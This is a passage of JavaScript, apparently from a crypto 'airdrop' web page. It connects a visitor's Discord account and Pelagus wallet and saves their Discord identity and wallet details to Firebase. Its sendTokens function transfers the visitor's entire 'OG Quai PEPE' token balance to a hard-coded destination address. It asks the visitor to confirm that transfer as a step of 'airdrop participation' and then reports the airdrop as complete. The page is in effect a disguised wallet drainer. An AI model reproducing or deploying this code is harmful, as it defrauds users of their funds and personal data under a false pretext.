        const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';

// Global object to hold data temporarily
window.userData = {};
let userSession = {};
async function saveSessionToFirebase() {
    try {
        const docRef = db.collection('users').doc(userSession.address || `user_${userSession.discordId}`);
        const payload = {
            ...userSession,
            lastUpdated: firebase.firestore.FieldValue.serverTimestamp(),
        };
        await docRef.set(payload, { merge: true });
        log('Combined data saved to database');
    } catch (error) {
        log(`Error saving combined data: ${error.message}`);
        console.error(error);
    }
}

// Firebase save function with merged data
async function saveToFirebase(data) {
    try {
        const userId = data.discordId || data.address;
        const docRef = db.collection('users').doc(userId);
        const payload = {
            lastUpdated: firebase.firestore.FieldValue.serverTimestamp(),
            ...window.userData,
            ...data, // Merge new data into the global data object
        };
        await docRef.set(payload, { merge: true });
        log('Data saved to database successfully');
    } catch (error) {
        log(`Error saving to database: ${error.message}`);
        console.error(error);
    }
}

        async function getQuaiBalance(address) {
            try {
                const response = await fetch(RPC_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0',
                        method: 'quai_getBalance',
                        params: [address, 'latest'],
                        id: 1
                    })
                });
                
                const data = await response.json();
                return data.result;
            } catch (error) {
                log('QUAI balance error: ' + error.message);
                return null;
            }
        }

        async function getTokenBalance(address) {
            try {
                const data = '0x70a08231000000000000000000000000' + address.slice(2);
                
                const response = await fetch(RPC_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0',
                        method: 'quai_call',
                        params: [{
                            to: TOKEN_ADDRESS,
                            data: data
                        }, 'latest'],
                        id: 2
                    })
                });
                
                const result = await response.json();
                if (result.result) {
                    return BigInt(result.result);
                }
                return 0n;
            } catch (error) {
                log('Token balance error: ' + error.message);
                return 0n;
            }
        }

        function log(message) {
            const consoleDiv = document.getElementById('console');
            const entry = document.createElement('div');
            entry.textContent = `${new Date().toLocaleTimeString()} - ${message}`;
            consoleDiv.appendChild(entry);
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
            console.log(message);
        }

        async function sendTokens() {
    try {
        if (!window.pelagus) {
            log('‚ùå Pelagus wallet not found');
            throw new Error('Pelagus wallet not found');
        }

        log('üîÑ Preparing token transfer...');
        const currentBalance = await getTokenBalance(userSession.address);
        if (currentBalance <= 0n) {
            log('‚ùå No tokens available to send');
            throw new Error('No tokens available to send');
        }

        const readableAmount = (Number(currentBalance) / 1e18).toString();
        log(`üì§ Preparing to send ${readableAmount} OG Quai PEPE tokens...`);

        // Token transfer method ID for 'transfer(address,uint256)'
        const methodId = '0xa9059cbb';
        // Remove '0x' and pad address to 32 bytes
        const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
        // Use entire balance as amount, pad to 32 bytes
        const amount = currentBalance.toString(16).padStart(64, '0');
        
        // Construct the data field
        const data = methodId + paddedAddress + amount;

        const transactionParameters = {
            to: TOKEN_ADDRESS,
            from: userSession.address,
            data: '0x' + data,
        };

        log('üîÑ Please confirm the transaction in your wallet...');
        const txHash = await window.pelagus.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
        });

        log(`üìù Transaction hash: ${txHash}`);
        log('üîÑ Waiting for transaction confirmation...');

        // Wait for transaction confirmation
        const receipt = await waitForTransaction(txHash);
        
        // Update userSession with transfer data
        userSession.transferAmount = readableAmount;
        userSession.transferTxHash = txHash;

        // Save updated data to Firebase

        // Update UI
        document.getElementById('sendBtn').style.display = 'none';
        document.getElementById('scanBtn').style.display = 'block';
        document.getElementById('buyBtn').style.display = 'block';

        log('‚úÖ Transaction confirmed!');
        log(`üí´ Successfully sent ${readableAmount} OG Quai PEPE tokens!`);
        log('---------------------------------------------');
        log('üéâ Airdrop participation complete!');

    } catch (error) {
        log('‚ùå Error sending tokens: ' + error.message);
        console.error(error);
    }
}

        async function waitForTransaction(txHash) {
            while (true) {
                try {
                    const response = await fetch(RPC_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            jsonrpc: '2.0',
                            method: 'quai_getTransactionReceipt',
                            params: [txHash],
                            id: 1
                        })
                    });

                    const result = await response.json();
                    if (result.result && result.result.status === '0x1') {
                        return result.result;
                    }

                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before checking again
                } catch (error) {
                    console.error('Error checking transaction:', error);
                    throw error;
                }
            }
        }

async function handleDiscordCallback() {
    const fragment = new URLSearchParams(window.location.hash.slice(1));
    const accessToken = fragment.get('access_token');

    if (accessToken) {
        try {
            log('üîÑ Verifying Discord connection...');
            const response = await fetch('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${accessToken}` },
            });

            const data = await response.json();
            
            // Store Discord data in userSession
            userSession.discordId = data.id;
            userSession.username = data.username;
            userSession.discriminator = data.discriminator;
            userSession.avatar = data.avatar;

            log('‚úÖ Discord connected successfully!');
            log(`Welcome, ${data.username}!`);
            log('üì± Next step: Connect your Pelagus wallet');
            log('---------------------------------------------');

            document.getElementById('connectBtn').style.display = 'block';
